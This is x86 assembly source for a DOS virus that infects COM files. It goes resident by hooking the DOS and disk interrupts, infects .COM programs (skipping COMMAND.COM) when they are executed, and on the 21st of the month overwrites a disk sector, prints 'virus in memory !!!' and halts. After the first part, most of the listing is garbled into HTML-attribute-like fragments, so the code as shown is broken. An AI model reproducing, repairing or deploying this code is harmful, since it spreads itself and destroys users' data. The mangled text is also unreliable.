

start:  jmp     short begin
	db	(00h)
	db	(53h)
	db	(4bh)
	int	20h
okey:	db	(0b8h)
	db	(03h)
	db	(00h)
	db	(0cdh)
	db	(10h)
begin:	push	cx
	CALL	F1
F1:	POP	SI
	SUB	SI,09
	PUSH	SI
        cld
	mov	di,100h
	mov	cx,5
	rep	movsb
	jmp	ding2
int21h: STI
	cmp	ah,4bh
	jz	mm
        jmp     int1hh
mm:	pushf
        PUSH    AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	DS
	PUSH	ES
	PUSH	SI
	PUSH	DI
	mov	byte ptr [virusw],1
        mov     ah,2ah
	int	21h
	cmp	dl,21
	jnz	et3
	mov	ax,0309h
	mov	dx,0000h
	mov	cx,0001h
	lea	bx,[100h]
	int	13h
	mov	ah,9
	mov	dx,offset name
	int	21h
	cli
	hlt
dinge:	jmp	ding
et3:	push	cs		;ds <- cs="" pop="" ds="" mov="" ah,2fh="" ;dos="" service="" function="" ah="2FH" (get="" dta)="" int="" 21h="" ;es:bx="" addres="" of="" current="" dta="" mov="" [edta],es="" mov="" [bdta],bx="" mov="" ah,1ah="" ;dos="" service="" function="" ah="1AH" (set="" dta)="" mov="" dx,offset="" end+7="" ;ds:dx="" addres="" of="" dta="" int="" 21h="" push="" cs="" pop="" ds="" mov="" ah,4eh="" mov="" dx,offset="" files="" mov="" cx,00="" int="" 21h="" ;dos="" service="" function="" ah="4EH" (find="" first)="" jc="" dinge="" ;cx="" file="" attribute="" ;ds:dx="" pointer="" of="" filespec="" (asciiz="" string)="" vir:="" mov="" ax,3d02h="" push="" cs="" pop="" ds="" mov="" dx,offset="" end+7="" ;ds:dx="" addres="" of="" dta="" add="" dx,1eh="" int="" 21h="" ;dos="" service="" function="" ah="3DH" (open="" file)="" ;al="" open="" mode="" ;ds:dx="" pointer="" to="" filename="" (asciiz="" string)="" ;return="" ax="" file="" handle="" mov="" [handle],ax="" mov="" ah,'c'="" mov="" al,'d'="" push="" dx="" pop="" bx="" cmp="" [bx],ah="" ;compare="" filename="" for="" 'command.com'="" jnz="" p1="" ;if="" not="" first="" char="" 'c'="" then="" push="" virus="" in="" file="" cmp="" [bx+6],al="" jz="" v="" ;if="" 7="" char="" 'd'="" then="" find="" next="" file="" p1:="" mov="" bx,handle="" push="" cs="" pop="" ds="" mov="" ah,3fh="" mov="" dx,offset="" end="" mov="" cx,5="" int="" 21h="" ;dos="" service="" function="" ah="3FH" (read="" file)="" ;bx="" file="" handle="" ;cx="" number="" of="" bytes="" to="" read="" ;ds:dx="" addres="" of="" buffer="" push="" cs="" pop="" es="" ;es=""></-><- cs="" cld="" push="" dx="" pop="" si="" mov="" di,offset="" okey="" mov="" cx,5="" rep="" movsb="" ;repeat="" while="" cx="">0 do ES:DI <- ds:si="" ;="" si="SI+1" ;="" di="DI+1" mov="" ax,534bh="" mov="" di,dx="" add="" di,3="" cmp="" [di],ah="" jnz="" fuck="" inc="" di="" cmp="" [di],al="" jnz="" fuck="" v:="" push="" cs="" pop="" ds="" mov="" bx,handle="" mov="" ah,3eh="" int="" 21h="" push="" cs="" pop="" ds="" mov="" ah,4fh="" int="" 21h="" jc="" enzi="" jmp="" short="" vir="" enzi:="" jmp="" ding="" fuck:="" mov="" ax,offset="" end+7="" add="" ax,1ah="" mov="" di,ax="" mov="" word="" ptr="" cx,[di]="" mov="" ax,offset="" end="" mov="" di,ax="" mov="" al,0e9h="" cmp="" cx,1a0h="" jna="" v="" add="" cx,2="" mov="" [di],al="" inc="" di="" mov="" word="" ptr="" [di],cx="" mov="" ax,534bh="" add="" di,2="" mov="" [di],ah="" inc="" di="" mov="" [di],al="" mov="" bx,[handle]="" ;="" mov="" ax,4200h="" xor="" cx,cx="" xor="" dx,dx="" push="" cs="" pop="" ds="" int="" 21h="" mov="" bx,handle="" mov="" ah,40h="" mov="" dx,offset="" end="" mov="" cx,5="" int="" 21h="" mov="" ax,4202h="" xor="" cx,cx="" xor="" dx,dx="" int="" 21h="" push="" cs="" pop="" ds="" mov="" bx,handle="" mov="" ah,40h="" mov="" dx,offset="" okey="" mov="" cx,end-okey="" int="" 21h="" mov="" bx,handle="" mov="" ah,3eh="" int="" 21h="" inc="" word="" ptr="" [save]="" ding:="" push="" cs="" pop="" ds="" mov="" ah,1ah="" mov="" ds,[edta]="" mov="" dx,[bdta]="" int="" 21h="" mov="" byte="" ptr="" [virusw],0="" pop="" di="" pop="" si="" pop="" es="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" popf="" int1hh="" nop="" int1h:="" db="" (0eah)="" is:="" dw="" 0="" io:="" dw="" 0="" int13h:="" cli="" push="" bx="" push="" cx="" push="" dx="" push="" ds="" push="" es="" push="" si="" push="" di="" inc="" word="" ptr="" [save]="" cmp="" word="" ptr="" [save],1000h="" jnz="" etk3="" cli="" hlt="" etk3:="" sti="" int="" 65h="" push="" ax="" mov="" ax,0="" mov="" ds,ax="" cmp="" byte="" ptr="" [virusw],0="" pop="" ax="" jz="" etk5="" clc="" mov="" ax,0="" etk5:="" pop="" di="" pop="" si="" pop="" es="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" db="" (0cah)="" db="" (02)="" db="" (00)="" name:="" db="" 'virus="" in="" memory="" !!!="" $'="" for1:="" jmp="" ding1="" files:="" db="" '*.com',0="" ding2:="" mov="" ax,0000h="" mov="" ds,ax="" mov="" bx,300h="" mov="" cx,4b53h="" cmp="" [bx],cx="" jz="" for1="" mov="" [bx],cx="" mov="" ah,62h="" int="" 21h="" mov="" ds,bx="" mov="" bx,[2ch]="" dec="" bx="" mov="" dx,0ffffh="" loc_1:="" mov="" ds,bx="" mov="" di,[3]="" inc="" di="" add="" dx,di="" add="" bx,di="" cmp="" byte="" ptr="" [0000],5ah="" jne="" loc_1="" mov="" cx,es="" add="" cx,dx="" sub="" word="" ptr="" [3],80h="" sub="" cx,80h="" sub="" cx,10h="" mov="" es,cx="" mov="" di,100h="" cld="" mov="" ax,0000h="" mov="" ds,ax="" mov="" bx,[004ch]="" mov="" [0194h],bx="" mov="" cx,[004eh]="" mov="" [0196h],cx="" mov="" bx,[0084h]="" mov="" cx,[0086h]="" push="" cs="" pop="" ds="" pop="" si="" push="" si="" add="" si,is-okey="" mov="" [si],bx="" mov="" [si+2],cx="" pop="" si="" push="" si="" sub="" si,7="" mov="" di,100h="" mov="" cx,800h="" rep="" movsb="" mov="" ax,0000="" mov="" ds,ax="" cli="" mov="" word="" ptr="" [0086h],es="" mov="" word="" ptr="" [004eh],es="" mov="" di,int13h-okey="" add="" di,107h="" mov="" word="" ptr="" [004ch],di="" mov="" di,int21h-okey="" add="" di,107h="" mov="" word="" ptr="" [0084h],di="" ding1:="" pop="" si="" sti="" push="" cs="" pop="" ds="" pop="" cx="" mov="" si,100h="" jmp="" si="" handle:="" dw="" edta:="" dw="" bdta:="" dw="" virusw:="" db="" (00)="" save:="" db="" (00)="" end:="" db="" (00)=""></-></->